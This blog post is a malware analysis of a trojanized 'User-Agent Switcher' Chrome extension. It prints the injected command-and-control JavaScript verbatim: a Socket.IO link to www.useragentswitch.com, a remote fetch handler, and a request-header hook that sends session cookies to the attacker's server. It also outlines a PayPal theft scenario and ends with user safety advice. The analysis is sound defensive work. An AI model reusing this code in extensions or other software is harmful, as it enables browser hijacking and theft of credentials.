---
layout: post
title: "Inside 'User-Agent Switcher': The Dark Side of Influencer Promotion"
permalink: /2020/inside-user-agent-switcher-malicious-extension/
description: "In a dystopian future where 'followers' and 'likes' can turn one person's social media account into a million-dollar brand-deal powerhouse, those unoriginal enough will pay hundreds or thousands of dollars to try to enter the social media stratosphere through shady deals and malicious methods. Oh, wait."
date: 2020-10-12 00:00:00
tags:
- malware
- extension
- chrome
---

![Chrome Web Store's User-Agent Switcher extension page (malicious).](/2020/inside-user-agent-switcher-malicious-extension/store-uas-malicious-small.png)

## Observation

Spinning up resources to test this extension and monitor its traffic was simple. Since I didn't have an Instagram account tied to my phone, I signed up for one that I could comfortably destroy. Extensions obey Chrome's connection settings, so all I needed was a VM on an isolated network with Chrome and [Burp Suite](https://portswigger.net/burp). After installing the extension and restarting my browser for good measure, the results started rolling in quickly.



Contacts an unknown domain
Sits for a couple minutes
Begins browsing automatically to sites

socket.io?
websocket starts
heartbeats frequently
events for command and control

malicious af

## Dissection

Hopping into the extension directory, we're greeted with simple internals - mostly JavaScript, some HTML, CSS, and little else. The extension's files are available [here](https://github.com/partridge-tech/chris-blog/tree/master/_content/2020/inside-user-agent-switcher-malicious-extension/no-publish/) for your own exploration. The JavaScript files have been minified (a space-saving measure), so I "beautified" them with [js-beautify](https://github.com/beautify-web/js-beautify) before beginning.

To try to get an early lead, I searched `www.useragentswitch.com` to see if the C&C domain was hardcoded, on the off chance that the malicious components of this extension weren't [obfuscated](https://github.com/javascript-obfuscator/javascript-obfuscator). Surprisingly, it matched in `js/background.min.js`:

```js
            return chrome.tabs.create({
                url: "http://www.esolutions.se/whatsmyinfo"
            }), !1
        },
        title: "Show User-agent",
        type: "normal"
    })
}
var userAgentSwitch = io("https://www.useragentswitch.com/");

function setUserAgent(e, t, s, n) {
    for (var r, a = 0; a < userAgents.length; a)
```

Even better, we got another lead only a few lines away. What is `esolutions.se/whatsmyinfo`? A quick Google search shows that [eSolutions Nordic AB](https://www.esolutions.se/) is a small development company - one which also dabbles in building useful Chrome extensions, such as... [User-Agent Switcher](https://chrome.google.com/webstore/detail/user-agent-switcher/aedikcfpfonanffanecfolneiaoakmlc)!

![Chrome Web Store's User-Agent Switcher extension page (nonmalicious).](/2020/inside-user-agent-switcher-malicious-extension/store-uas-clean-small.png)

Looks like our malware authors picked a common tactic: downloading an existing extension, inserting malware, uploading their malicious copy to the Chrome Web Store, and then [inflating the download count](https://www.theregister.com/2020/05/28/chrome_web_store_fraud/) to manipulate users into trusting it as "safe."

Fortunately for us, this gives us a really powerful method to trim down the code we'll need to look through. Unpacking the clean User-Agent Switcher extension (including beautifying its JavaScript), aligning the file structure (to account for the different version folder), and [diffing](https://linux.die.net/man/1/diff) the two extension folders, only a few files are different: `js/background.min.js`, `js/bootstrap.min.js`, `js/JsonValues.min.js`, `manifest.json`, `_metadata/computed_hashes.json`, and `_metadata/verified_contents.json`. Eliminating irrelevant files (metadata and contents), as well as `js/bootstrap.min.js` which contains different *comments* but not different *code*, we're left with only two files to go through: `js/JsonValues.min.js` and `js/background.min.js`.

#### js/JsonValues.min.js

Taking a look at the [diff](/2020/inside-user-agent-switcher-malicious-extension/unpacked-contents.diff), `js/JsonValues.min.js` only had content appended to it - pruning through, it's quickly apparent that most or all of the added content is the [Socket.IO](https://socket.io/) client. I wasn't certain that was the only content added to this file, so I ran it through [JS NICE](http://www.jsnice.org/) - a project which attempt to intelligently reassemble obfuscated or minified JavaScript by [SRI Lab](http://www.sri.inf.ethz.ch/) at [ETH Zürich](http://www.ethz.ch/) - to see if anything caught my eye after it was automatically annotated. Nothing did, so I took a couple notes and moved on.

#### js/background.min.js

With a much more complex [diff](/2020/inside-user-agent-switcher-malicious-extension/unpacked-contents.diff), `js/background.min.js` is the real "brain" of the User-Agent Switcher's malicious components, whose activity is deceptively simple. Removing the noise from the version and minification differences between the extensions we're comparing, the malicious content the author added is only ~30 lines long. While simple, it gives the malware author more than enough control over a user's browser to do nefarious things.

## Analysis

The way this malware works is fairly simple, since [Socket.IO](https://socket.io)'s client-side WebSockets library handles the complexities of making, managing, and interacting with WebSockets. However, since it is principally event- and hook-driven, it may be hard to interpret for observers who aren't familiar with JavaScript. We'll go through the malicious code in sections before bringing it all together.

#### Initializing

Chrome loads `background.html` on browser start, which in turn loads `js/background.min.js` and `js/JsonValues.min.js`. The first thing User-Agent Switcher's malicious component does is initialize a WebSocket to its Command & Control server, which is a one-liner thanks to Socket.IO:

```js
var userAgentSwitch = io("https://www.useragentswitch.com/");
```

#### Fraudulent Request Handling

It also registers two event hooks on the socket that was just created. The first processes incoming `createFetch` events, which detail fraudulent requests that your browser is being used to execute. These events are passed directly to an asynchronous `createFetch` function, which fetches the requested content, then the results are passed as events which it sends to the Command and Control server via `emit()`.

```js
userAgentSwitch.on("createFetch", async function(e) {
    let t = await createFetch(e);
    userAgentSwitch.emit(e.callBack, t)
});

async function createFetch(e) {
    let t = await fetch(e.uri, e.attr),
        s = {};
    return s.headerEntries = Array.from(t.headers.entries()), s.data = await t.text(), s.ok = t.ok, s.status = t.status, s
}
```

#### Capturing Headers & Deobfuscating

The second event hook that is added to the socket is to process `handlerData` events, which lists hosts that User-Agent Switcher would like to intercept headers on outgoing requests for - capturing session cookies, User-Agent strings, and more. User-Agent Switcher also registers a function titled `handler2` which is invoked on all outgoing web requests before the headers are sent, doing two important functions:
- Checking to see if the domain that a request is being made for is in our local `handlerData` object, and if so, sending an event via `emit()` to the Command and Control server with the headers of the request.
- Removing any "obfuscating" `-zzz` strings in header parameters from `createFetch` events (presumably to defeat some part of the Chrome Web Store's malware detection capabilities), and reconstructing the headers afterwards.

```js
var handlerData = {};
userAgentSwitch.on("handlerData", function(e) {
    handlerData = e
});

var handler2 = function(e) {
    var t = Object.keys(handlerData);
    if (t.length > 0) {
        var s = !0;
        for (let n = 0; n < t.length; n++) {
            let r = t[n];
            if (re = new RegExp(handlerData[r], "gi"), null == e[r].toString().match(re)) {
                s = !1;
                break
            }
        }
        s && userAgentSwitch.emit("requestHeadersHandler", e)
    }
    return {
        requestHeaders: JSON.parse(JSON.stringify(e.requestHeaders.reverse()).split("-zzz").join(""))
    }
};
chrome.webRequest.onBeforeSendHeaders.addListener(handler2, {
    urls: ["<all_urls>"]
}, ["requestHeaders", "blocking", "extraHeaders"]), runAppStart(), setIconAndText();
```

#### Data Flow

And that's it - the rest of the client-side C&C is 100% handled by Socket.IO and not inherently malicious - including:
- Establishing a WebSocket connection
- Reconnecting the WebSocket connection in case of a failure
- Packaging events and data into a custom protocol
- Responding to and sending heartbeats to keep the WebSocket alive

If you're curious or want to learn more about how Socket.IO works, check out their [documentation](https://socket.io/docs/). Putting Socket.IO's protocol together with the malicious code we explored, the control data flow can be mapped out as:

![User-Agent Switcher Command and Control schema.](/2020/inside-user-agent-switcher-malicious-extension/cnc-logic.png)

#### Flexibility

The most important takeaway is that this malware, while simple, can be instructed by the malware author to perform nefarious actions on any site. If the author wanted to expand into bigger and badder territory - such as stealing online banking credentials - they could launch that attack immediately, without even updating the client. Say the author decides to try stealing money from my PayPal account:

- Send a `handlerData` event with PayPal's domain (www.paypal.com)
- Send a `createFetch` event for PayPal's dashboard

At that point, the malware author now has my session token, and could choose between executing requests remotely or on their own infrastructure (as they also have my browser information). If they chose to execute remotely, they would simply need to send more `createFetch` events to collect context (ex. how much money is in my account) and then POST transfer requests to PayPal's API. The only protection I have is that _maybe_ PayPal would ask me to reenter my password if the transfer account was large enough or the user is not known - which extensions running in the background (thankfully) wouldn't be able to bypass without your password.

However, it could be updated to have functionality which would bypass the need for your password. Modifying money transfer requests so they will be sent to an attacker-controlled account would be a trivial change, and is functionally similar to how `handler` (from the clean version of User-Agent Switcher) and `handler2` hook to outgoing requests for rewriting. Further, it's unlikely that this behavior would be detected by Google's automatic and manual review processes, since they haven't detected the techniques used by this malware - as long as the hook was written similarly and didn't directly reference PayPal, it would probably be approved without a second thought.

## Taking Action

Which brings us to the most disappointing section - knowing more than enough about how this malware works, and reporting it to parties which host or support it, has there been any action to remove it?

**As of Monday, October 12, 2020: No.**

Despite reaching the top of [r/cybersecurity](https://reddit.com/r/cybersecurity), getting some very bad reviews, and having a bunch of people (including me) report this extension to Google over the past week ([u/ufo56](https://reddit.com/user/ufo56)'s post was Tuesday, October 06 2020), it is currently still available for download from the Chrome Web Store.

Any unsuspecting user that has this extension installed is still having their accounts manipulated for influencer promotion, and is at risk of becoming a victim to high-impact attacks on other web services they use - as they have been for *at least* one month (since the extension was updated on September 7th 2020, and possibly people have been at risk for much longer than that based on the oldest comments).

With the increased pressure from this writeup - and hopefully positive community response - I'm sure this malware will eventually be removed from the Chrome Web Store, which will automatically purge it from users who had installed it previously as well. However, that begs the question: if ufo56 didn't make a post on Reddit about this, or their post hadn't gained any traction, and they'd simply filed their report and moved on: how long would this malware remain on the Chrome Web Store? Would their one report have generated any action at all?

## Security Recommendations

While it's not the most potent or original malware ever seen, it serves as an important reminder to be diligent and thoughtful about how to manage our safety online. Most everyone who has read through this post probably knows these, so if nothing else, *tell your friends* so they can get a deeper understanding of how to stay secure.

- **Just because it's on the Chrome Web Store, doesn't mean it's safe.** This malicious extension isn't an [isolated incident](https://threatpost.com/500-malicious-chrome-extensions-millions/152918/). I would love to live in a world where I could simply say "Google Trust & Safety took care of this concern for you," but we're not there yet in the same way that Apple can't stop all Mac malware, Microsoft can't stop all Windows malware, ad infinitum. This is the price we pay for diverse application marketplaces: less per-app security supervision. Therefore, users should always be thoughtful and careful when downloading applications, even off company-run app stores.
- **Don't install extensions from untrusted authors.** [Downloads](https://www.theregister.com/2020/05/28/chrome_web_store_fraud/) and [reviews](https://www.quora.com/Should-I-boost-my-Chrome-extension-user-base-by-buying-users-and-reviews) can be bought - reputation can't (...[as cheaply](https://www.caoc.org/?pg=facts)). What do people say about the author of the extension you're about to download? Is it a well-known company? Can you make sure it's that company's extension, and not someone pretending to be that company?
- **Be extra cautious when installing extensions which can 'read and change all your data on the websites you visit.' (or similar)** Extensions that request this permission from your browser can do nearly anything, including impersonate your actions on the sites you use (and sites you don't), like UAS does. ♪ "Anything you can do I can do better... without your knowledge" ♪ isn't quite musical, but it is [pretty close](https://security.stackexchange.com/questions/15259/worst-case-scenario-what-can-a-chrome-extension-do-with-your-data-on-all-websi) to the truth.
- **If you see something, say something.** When something happens on your computer that you didn't expect - such as likes, posts, emails, or other things appearing which you're fairly sure you didn't create - phone a technologically-adept friend. If you're at work, alert your workplace's IT or Information Security groups. Antimalware will never be perfect, and this extension slips by [61/61](https://www.virustotal.com/gui/file/d5a988742418a06ba6c0649e6ace78eb4bcd061f2222f1a9cc1d97492763cd09/detection) antimalware programs on VirusTotal. Even layered solutions could miss it, and running `www.useragentswitch.com` through some [threat-blocking DNS providers](https://www.ipvoid.com/dns-reputation/), only CleanBrowsing picked it up, and that's likely because it's an [unusually new domain](/2020/inside-user-agent-switcher-malicious-extension/whois-useragentswitch.com.txt).

Stay safe and be well.